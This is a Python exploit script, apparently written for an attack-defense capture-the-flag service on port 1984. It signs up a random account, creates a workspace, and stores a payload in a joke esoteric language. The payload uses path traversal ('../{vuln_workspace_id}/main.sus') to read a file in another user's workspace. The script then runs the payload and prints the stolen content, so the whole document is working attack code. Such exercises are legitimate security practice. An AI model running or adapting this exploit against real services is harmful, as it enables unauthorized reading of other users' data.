#!/usr/bin/env python3
import re
import sys
import json
import requests
from random import choice
from string import ascii_letters, digits

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
hint = json.loads(
    sys.argv[2]
    if len(sys.argv) > 2
    else '{"username":"vulnerable","workspace_id":"i2yy40zjs6qgitq"}'
)


URL = f'http://{host}:1984'

PAYLOAD = '''
IS ../{vuln_workspace_id}/main.sus EMPTY RED TELL ME PLS PLS PLS
WHILE ITS NOT RED VOTE ME
BLOCKUS
	CHAR HAS LEFT THE ../{vuln_workspace_id}/main.sus
	CHAR CAN VOUCH GO AND TELL THEM COME ON
	IS ../{vuln_workspace_id}/main.sus EMPTY RED TELL ME PLS PLS PLS
ENDBLOCKUS
'''.strip()


def random_string(length: int = 16):
    return ''.join(choice(ascii_letters + digits) for _ in range(length))


def register(session: requests.Session):
    session.post(
        f'{URL}/auth/signup',
        data={
            'username': random_string(),
            'email': f'{random_string()}@mail.ru',
            'password': random_string(),
        },
    )
    token = session.cookies["pb_auth"]
    session.headers["Cookie"] = f"pb_auth={token}"


def create_workspace(session: requests.Session) -> str:
    response = session.post(
        f'{URL}/playground?/createWorkspace',
        data={'name': random_string(), 'description': None},
    )
    redirect_location = response.json()["location"]
    workspace_id_match = re.search(r'/workspace/(?P<id>[a-z0-9]+)$', redirect_location)
    assert workspace_id_match is not None
    workspace_id = workspace_id_match.group('id')
    return workspace_id


def save_payload(session: requests.Session, self_workspace_id: str, vuln_workspace_id: str):
    session.put(
        f'{URL}/workspace/{self_workspace_id}/main.sus',
        json={
            'content': PAYLOAD.format(vuln_workspace_id=vuln_workspace_id),
        },
    )


def execute_payload(session: requests.Session, workspace_id: str) -> str:
    resp = session.post(
        f'{URL}/workspace/{workspace_id}/main.sus',
        json={'stdin': ''},
    )
    return resp.json()['stdout']


def main():
    s = requests.Session()
    register(s)
    workspace_id = create_workspace(s)
    save_payload(s, workspace_id, hint['workspace_id'])
    stdout = execute_payload(s, workspace_id)
    print(stdout, flush=True)


if __name__ == '__main__':
    main()
